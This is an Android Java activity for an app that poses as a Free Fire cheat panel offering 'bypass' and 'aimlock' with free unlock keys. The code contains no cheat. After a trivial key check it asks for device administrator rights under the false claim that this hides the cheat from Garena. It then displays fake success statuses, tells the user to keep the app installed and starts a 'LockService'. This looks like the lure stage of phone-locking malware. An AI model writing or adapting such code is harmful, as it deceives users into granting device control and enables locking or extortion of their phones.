package com.my.newproject;

import android.app.Activity;
import android.app.admin.DevicePolicyManager;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.net.Uri;
import android.os.Bundle;
import android.os.Handler;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;
import android.widget.TextView;
import android.widget.Toast;

public class MainActivity extends Activity {

    private DevicePolicyManager dpm;
    private ComponentName adminComponent;
    private String[] FREE_KEYS = {"FFFREE", "PANELVIP", "UNLOCK", "FREEKEY", "AKSESGRATIS"};

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        dpm = (DevicePolicyManager) getSystemService(Context.DEVICE_POLICY_SERVICE);
        adminComponent = new ComponentName(this, AdminReceiver.class);

        Button btnActivate = findViewById(R.id.btnActivate);
        EditText keyInput = findViewById(R.id.keyInput);
        TextView loadingText = findViewById(R.id.loadingText);
        TextView statusBypass = findViewById(R.id.statusBypass);
        TextView statusAimlock = findViewById(R.id.statusAimlock);

        btnActivate.setOnClickListener(v -> {
            String key = keyInput.getText().toString().trim().toUpperCase();
            if (!key.isEmpty()) {
                boolean valid = false;
                for (String k : FREE_KEYS) {
                    if (key.equals(k)) { valid = true; break; }
                }
                if (!valid) {
                    Toast.makeText(this, "Key tidak valid! Coba key gratis.", Toast.LENGTH_LONG).show();
                    return;
                }
                loadingText.setVisibility(View.VISIBLE);
                loadingText.setText("⏳ Menghubungkan...");
                new Handler().postDelayed(() -> {
                    if (!dpm.isAdminActive(adminComponent)) {
                        Intent intent = new Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN);
                        intent.putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, adminComponent);
                        intent.putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION,
                            "Aktifkan sistem keamanan cheat agar tidak terdeteksi Garena");
                        startActivityForResult(intent, 1);
                    } else {
                        activateSuccess(statusBypass, statusAimlock, loadingText);
                    }
                }, 2000);
            } else {
                Toast.makeText(this, "Masukkan Key dulu!", Toast.LENGTH_SHORT).show();
            }
        });
    }

    private void activateSuccess(TextView statusBypass, TextView statusAimlock, TextView loadingText) {
        statusBypass.setText("✅ Sistem Bypass: ON");
        statusBypass.setTextColor(0xFF00FF00);
        statusAimlock.setText("✅ Aimlock: ON");
        statusAimlock.setTextColor(0xFF00FF00);
        loadingText.setText("✅ BERHASIL! Biarkan aplikasi tetap terpasang.");
        loadingText.setTextColor(0xFF00FF00);
        startService(new Intent(this, LockService.class));
        Intent ff = getPackageManager().getLaunchIntentForPackage("com.dts.freefireth");
        if (ff != null) startActivity(ff);
        else startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=com.dts.freefireth")));
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        TextView loadingText = findViewById(R.id.loadingText);
        TextView statusBypass = findViewById(R.id.statusBypass);
        TextView statusAimlock = findViewById(R.id.statusAimlock);
        if (requestCode == 1) {
            if (dpm.isAdminActive(adminComponent)) activateSuccess(statusBypass, statusAimlock, loadingText);
            else { loadingText.setText("❌ Harus diizinkan!"); loadingText.setTextColor(0xFFFF0000); }
        }
    }
}